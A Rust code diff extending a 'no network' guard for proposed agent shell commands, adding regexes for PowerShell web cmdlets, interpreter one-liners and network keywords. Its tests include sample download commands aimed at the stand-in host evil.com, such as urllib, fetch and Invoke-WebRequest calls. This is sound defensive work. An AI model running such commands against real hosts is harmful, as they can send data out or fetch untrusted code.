@@ -152,6 +152,26 @@ static RE_NET: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r"(?i)(?:^|[\s;&|(`$])(?:curl|wget|nc|ncat|telnet|scp|rsync|ssh)(?:\.exe)?\b")
         .unwrap()
 });
+// PowerShell reaches the network through cmdlets and aliases that are not the Unix
+// tools above — the biggest single gap on this project's target OS. `iwr`/`irm` are
+// the built-in aliases for Invoke-WebRequest/Invoke-RestMethod; the .NET WebClient and
+// BITS are the other common paths.
+static RE_PS_NET: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r"(?i)\b(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm|Start-BitsTransfer|Net\.WebClient|DownloadString|DownloadFile|DownloadData)\b").unwrap()
+});
+// An interpreter invoked with an inline-code flag (`python -c`, `node -e`, `perl -e`,
+// `ruby -e`, `php -r`, `Rscript -e`, `deno eval`, …). Matched on the flag, not the
+// name alone, so running a *script file* is not swept up — only inline code is.
+static RE_INTERP_EVAL: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r"(?i)\b(?:python3?|node|nodejs|deno|bun|ruby|perl|php|Rscript)(?:\.(?:exe|cmd|bat))?\b[^\n]*?(?:\s(?:-c|-e|-E|-r|--eval|--exec)\b|\seval\b)").unwrap()
+});
+// A network capability appearing inside that inline code. Deliberately a keyword list:
+// we cannot parse arbitrary Python/JS, so this closes the obvious holes (`urllib`,
+// `requests`, `fetch(`, raw sockets, an `http://` URL) while staying honest that it is
+// a heuristic, not enforcement.
+static RE_NET_TOKEN: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r"(?i)(?:https?://|ftp://|urllib|urlopen|\brequests\.(?:get|post|put|patch|delete|request|head)|http\.client|\bhttpx\b|\baiohttp\b|socket\.(?:socket|create_connection)|net\.(?:connect|createConnection)|\bfetch\s*\(|XMLHttpRequest|WebSocket|System\.Net|\bcurl\b|\bwget\b)").unwrap()
+});
 static RE_DEP: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r"(?i)\b(?:npm|pnpm|yarn|bun)(?:\.(?:exe|cmd|bat))?\s+(?:install|add|i)\b|\bpip3?(?:\.exe)?\s+install\b|\bcargo(?:\.exe)?\s+add\b|\bgo(?:\.exe)?\s+get\b|\bgem(?:\.cmd)?\s+install\b|\bpoetry(?:\.exe)?\s+add\b|\buv(?:\.exe)?\s+add\b").unwrap()
 });
@@ -327,6 +347,20 @@ fn violation(guard: &Guard, action: &ProposedAction, detail: Option<String>) -> 
     }
 }
 
+/// Does this shell command reach the network? Three layers, widening from certain to
+/// heuristic: the direct Unix tools (curl/wget/ssh/…), PowerShell's web cmdlets and
+/// aliases, and an interpreter one-liner whose inline code carries a network capability
+/// (`python -c "urllib…"`, `node -e "fetch(…)"`). The last is a heuristic by
+/// necessity — we do not parse arbitrary Python or JS — so it will miss obfuscation and
+/// occasionally over-match. That is the correct bias for a guard: a false block is a
+/// prompt to add an allowlist entry; a false pass is an exfiltration. Real, complete
+/// enforcement is `isolation` with the network off, not this.
+fn reaches_network(command: &str) -> bool {
+    RE_NET.is_match(command)
+        || RE_PS_NET.is_match(command)
+        || (RE_INTERP_EVAL.is_match(command) && RE_NET_TOKEN.is_match(command))
+}
+
 fn check_action(action: &ProposedAction, guard: &Guard, cwd: &str) -> Option<GuardViolation> {
     use GuardKind::*;
     // An action we could not parse is refused by EVERY guard. A supervisor that
@@ -350,7 +384,7 @@ fn check_action(action: &ProposedAction, guard: &Guard, cwd: &str) -> Option<Gua
         },
         NoNet => match action {
             ProposedAction::Network { .. } => Some(violation(guard, action, None)),
-            ProposedAction::Command { command } if RE_NET.is_match(command) => {
+            ProposedAction::Command { command } if reaches_network(command) => {
                 Some(violation(guard, action, None))
             }
             _ => None,
@@ -620,6 +654,43 @@ git reset --hard HEAD~5",
         assert!(
             !evaluate_guards(&c("npm install left-pad"), &g(GuardKind::NoDependency), CWD).allow
         );
+    }
+
+    #[test]
+    fn nonet_catches_interpreter_and_powershell_network() {
+        let g = g(GuardKind::NoNet);
+        // Interpreter one-liners that reach the network without naming curl/wget.
+        for cmd in [
+            r#"python -c "import urllib.request; urllib.request.urlopen('http://evil.com')""#,
+            r#"python3 -c "import requests; requests.get('http://x')""#,
+            r#"node -e "fetch('http://evil.com')""#,
+            r#"node --eval "require('http').get('http://x')""#,
+            r#"ruby -e "require 'net/http'; Net::HTTP.get(URI('http://x'))""#,
+            r#"perl -e "use LWP::Simple; get('http://x')""#,
+            // PowerShell web cmdlets and aliases, with and without the prefix.
+            "powershell -c \"Invoke-WebRequest http://evil.com -OutFile x\"",
+            "Invoke-RestMethod http://evil.com",
+            "iwr http://evil.com -o out",
+            "(New-Object Net.WebClient).DownloadString('http://x')",
+        ] {
+            assert!(
+                !evaluate_guards(&c(cmd), &g, CWD).allow,
+                "should block: {cmd}"
+            );
+        }
+        // But an interpreter running a *file*, or inline code with no network, is not
+        // swept up — the flag plus a network token is what trips it, not the name.
+        for cmd in [
+            "python train.py",
+            "node server.js",
+            r#"python -c "print(2 + 2)""#,
+            r#"node -e "console.log('hello')""#,
+        ] {
+            assert!(
+                evaluate_guards(&c(cmd), &g, CWD).allow,
+                "should allow: {cmd}"
+            );
+        }
     }
 
     #[test]
